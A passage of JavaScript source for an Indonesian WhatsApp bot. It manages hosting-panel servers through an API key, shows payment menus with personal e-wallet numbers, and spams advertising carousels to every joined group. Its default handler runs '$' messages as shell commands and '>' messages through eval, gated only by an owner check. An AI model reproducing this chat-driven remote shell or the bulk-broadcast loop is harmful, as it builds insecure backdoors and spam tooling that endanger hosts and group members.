* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Storage : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await fadhost.sendMessage(m.chat, { text: messageText }, { quoted: qtoko })
}
break
case "delpanel": case "hapuspanel": {
if (!isOwner) return fadhostReply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("idservernya\n\nuntuk melihat id server ketik *.listpanel*"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return m.reply("*ID Server/User* Tidak Ditemukan")
m.reply(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`)
}
break
case "payment": {
if (!isOwner) return fadhostReply(msg.owner)
let teksnya = `
Silahkan Pilih Payment Pembayaran Yang Tersedia Di Bawah Ini`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Payment", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Dana", "title": "Dana Payment", "id": ".danapay" }, 
{ "header": "Ovo", "title": "Ovo Payment", "id": ".ovopay" }, 
{ "header": "Gopay", "title": "Gopay Payment", "id": ".gopaypay" }, 
{ "header": "QRIS", "title": "QRIS Payment", "id": ".qrispay" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await fadhost.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case 'pay':{
const urldana = "https://telegra.ph/file/5908b9bad38cdf40b3fc9.jpg"
const urlgopay = "https://telegra.ph/file/e67d46317858a47a5c44c.jpg"
const urlovo = "https://telegra.ph/file/35fa2f31a2a60238cbef0.jpg"
const urlqris = "https://telegra.ph/file/35fa2f31a2a60238cbef0.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: fadhost.waUploadToServer
  })
  return imageMessage
}


    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {},
              carouselMessage: {
                cards: [
                  {
                    header: {
                      imageMessage: await image(urldana),
                      hasMediaAttachment: true,
                    },
                    body: { text: `PAYMENT DANA </ Vann - Dev />🌐` },
                    nativeFlowMessage: {
                      buttons: [
                        {
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"081511863470\"}`
},
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(urldana),
                      hasMediaAttachment: true,
                    },
                    body: { text: `PAYMENT GOPAY </ Vann - Dev />Z OFFICIAL ⚡🌐` },
                    nativeFlowMessage: {
                      buttons: [
                        {
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"085881902738\"}`
},
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(urlovo),
                      hasMediaAttachment: true,
                    },
                    body: { text: `PAYMENT PULSA </ Dixz - Dev />` },
                    nativeFlowMessage: {
                      buttons: [
                        {
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"081511863470\"}`
},
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(urlqris),
                      hasMediaAttachment: true,
                    },
                    body: { text: `QRIS ALLPAY </ Dixz - Dev />` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"MINTA AJA)","url":"https:\\/\\/wa.me\\/628995645747","webview_presentation":null}',
                        },
                      ],
                    },
                  },

                ],
                messageVersion: 1,
              },
            },
          },
        },
      },
      {}
    );

    await fadhost.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
            }
break
case "danapay": {
if (global.dana == false) return m.reply('Payment Dana Tidak Tersedia')
let teks = `
*Nomor Dana :*
${global.dana}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
fadhost.sendText(m.chat, teks, qchanel)
}
break
case "ovopay": {
if (global.ovo == false) return m.reply('Payment Ovo Tidak Tersedia')
let teks = `
*Nomor Ovo :*
${global.ovo}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
fadhost.sendText(m.chat, teks, qchanel)
}
break
case "gopaypay": {
if (global.gopay == false) return m.reply('Payment Gopay Tidak Tersedia')
let teks = `
*Nomor Gopay :*
${global.gopay}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
fadhost.sendText(m.chat, teks, qchanel)
}
break
case "qrispay": {
if (global.qris == false) return m.reply('Payment Qris Tidak Tersedia')
m.reply('Memproses Mengambil QRIS, Tunggu Sebentar . . .')
let teks = `
*Untuk Pembayaran Melalui QRIS All Payment, Silahkan Minta Ke Owner Saja*

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
fadhost.sendMessage(m.chat, {image: global.qris, caption: teks}, {quoted: qchanel})
}
break
case "jpmslide": case "startjpmslide": {
if (!isOwner) return fadhostReply(msg.owner)
let total = 0
let getGroups = await fadhost.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
let time = ms(delayjpm * Number(usergc.length))
let imgsc = await prepareWAMessageMedia({ image: await fs.readFileSync("./media/thumbnail.jpg") }, { upload: fadhost.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*</ Vann - Dev />* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*OPEN PANEL SRV PUBLIC*
📌1GB CPU 40% 1k/bulan
📌2GB CPU 60% 2k/bulan
📌3GB CPU 80% 4k/bulan
📌4GB CPU 100% 4k/bulan
📌5GB CPU 120% 5k/bulan
📌6GB CPU 140% 6k/bulan
📌7GB CPU 160% 7k/bulan
📌8GB CPU 180% 8/kbulan
📌9GB CPU 200% 9k/bulan
📌UNLI CPU UNLI 10k/bulan

KEUNTUNGAN PANEL:
BOT ON 24JAM
TIDAK BOROS KUOTA
BISA BUAT BOT
BISA RUN BOT
BISA BUAT BOT JPM
DLL
*READY INSTALL THEMA PANEL : 5-7K*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*OPEN PANEL SRV PRIVAT*
*📌1GB CPU 40%*
_HARGA : RP2.000_

*📌2GB CPU 60%*
_HARGA : RP3.000_

*📌3GB CPU 80%* 
_HARGA : RP4.000_

*📌4GB CPU 100%* 
_HARGA : RP5.000_

*📌5GB CPU 120%* 
_HARGA : RP6.000_

*📌6GB CPU 140%* 
_HARGA : RP7.000_

*📌7GB CPU 160%* 
_HARGA : RP8.000_

*📌8GB CPU 180%*
_HARGA : RP9.000_

*📌9GB CPU 200%* 
_HARGA : RP10.000_

*📌UNLI CPU UNLI* 
_HARGA : RP12.00_

*Keuntungan Panel :*
* Bisa Buat Panel Sepuasnya
* Bisa Jual Panel Sepuasnya
* Server *(High Quality)*
* Bot Auto Fast Respon
* Garansi Aktif 7 Hari
* Claim Garansi Wajib Bawa Bukti Transaksi!

*Ready Resseller Panel*
* *Harga :* Rp10.000/Permanen

*Ready Admin Panel*
* *Harga :* Rp15.000/Permanen

*Dan Ready Juga Pt panel*
* *Harga :* Rp25.000/Permanen
* Create Panel Lewat Bot
*MINAT?CHAT wa.me/6285783089587*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*OPEN MURNOKOS*
PRICE: 10K

KEUNTUNGAN MURNOK
BISA CREATE NOKOS 
BISA DARI BERBAGAI NEGARA
HARGA MURAH
DLL`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qchanel})
await fadhostReply(`Memproses Mengirim Pesan Slide Teks & Foto Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
for (let jid of usergc) {
try {
await fadhost.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await m.reply(`Berhasil Mengirim Pesan Slide Teks & Foto Ke *${total} Grup*`)
}
break

case 'bcgc': case 'bcgroup': {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(`Text mana?\n\nExample : ${prefix + command} fatih-san`)
let getGroups = await vallzoffc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
fadhost.sendMessage(i, {text: `${text}`}, {quoted:qchanel})
}
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return fadhost.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return fadhost.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
fadhost.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
fadhost.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return fadhost.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return fadhost.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
//fadhost.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})